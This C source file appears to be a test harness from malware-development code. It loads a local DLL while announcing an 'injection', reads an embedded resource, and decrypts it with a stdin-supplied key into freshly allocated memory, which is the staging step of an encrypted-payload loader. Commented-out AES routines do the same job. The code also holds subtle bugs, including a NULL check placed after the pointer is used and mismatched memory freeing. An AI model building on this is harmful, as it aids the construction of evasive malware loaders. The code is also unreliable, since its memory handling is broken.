#include "rsrcPayloadTest.h"

PBYTE Test()
{
	//if (argc < 2) { printf("No Dll Injected :(\n"); return NULL; }
	printf("[!] injecting \".\\DLL.dll\" To the local Process of Pid: %d\n[+] Loading Dll...\n", GetCurrentProcessId());

	HMODULE hLibrary = LoadLibraryA(".\\DLL.dll");
		if (!hLibrary) { //printf("[x] Failed!\n"); 
			return NULL; 
		}

	//printf("[i] Successful!\n");
	RESOURCE resource;
	if (!FetchResource(&resource)) return NULL;
	
	Context context_t;
	
	char key[256] = { '\0' };
	
	fgets(key, 255, stdin);

	size_t sKey = strlen(key);

	rInit(&context_t, (PUCHAR)key, sKey);

	lpPAYLOAD pPayload_t = LocalAlloc(LPTR, sizeof(PAYLOAD));

	pPayload_t->sText = resource.sSize;

	pPayload_t->pText = VirtualAlloc(0, pPayload_t->sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	rFin(&context_t, resource.pAddress, pPayload_t->pText, pPayload_t->sText);

	if (pPayload_t == NULL) 
	{
		VirtualFree(pPayload_t->pText, pPayload_t->sText, MEM_FREE); HeapFree(GetProcessHeap(), 0, pPayload_t);  return NULL;
	}

	return pPayload_t;

	/*
	//UCHAR    pKey[KEYSIZE];
	//UCHAR    pInitVec[IVSIZE];
	//UCHAR    pInitVecCopy[IVSIZE];
	srand(time(NULL));
	GenerateRandomBytes(pKey, KEYSIZE);
	
	srand(time(NULL) ^ pKey[0]);            
	GenerateRandomBytes(pInitVec, IVSIZE);
	
	memcpy(pInitVecCopy, pInitVec, IVSIZE);
	
	StatusCheck(pInitVecCopy, pKey, resource.pAddress, resource.sSize,"Resource");

	//PUCHAR rsrcText = malloc(resource.sSize);
	//if (!rsrcText) return NULL;
	//memcpy(rsrcText, resource.pAddress, resource.sSize);


	PUCHAR pCipherText;
	DWORD  sChiperText;

	//if (!aInit(rsrcText, resource.sSize, pKey, pInitVecCopy, &pCipherText, &sChiperText)) { free(rsrcText); return NULL; }
	
	//free(rsrcText);

	//StatusCheck(pInitVecCopy, pKey, pCipherText, sChiperText,"CipherText");
	
	//printf("[i] Heap Address: 0x%p\n[!] Encrypted!\n", pCipherText);

	PUCHAR pPlainText = malloc(sChiperText);
	DWORD  sPlainText = NULL;

	memcpy(pInitVecCopy, pInitVec, IVSIZE);

	aFin(pCipherText, sChiperText, pKey, pInitVecCopy, &pPlainText, &sPlainText);

	StatusCheck(pInitVecCopy, pKey, pPlainText, sPlainText, "PlainText");
	*/
	
	//printf("[i] Result: %s\n[i] Heap Address: 0x%p\n[!] Decrypted!\n", Text->pText, Text->pText);
	
	
}

VOID StatusCheck(
	IN PUCHAR pInitVec, 
	IN PUCHAR pKey,
	IN PUCHAR pData,
	IN size_t sData,
	IN PCHAR pName 
) {	
	PrintHexData("InitVec", pInitVec, IVSIZE);
	PrintHexData("Key", pKey, KEYSIZE);
	PrintHexData(pName, pData, sData);
}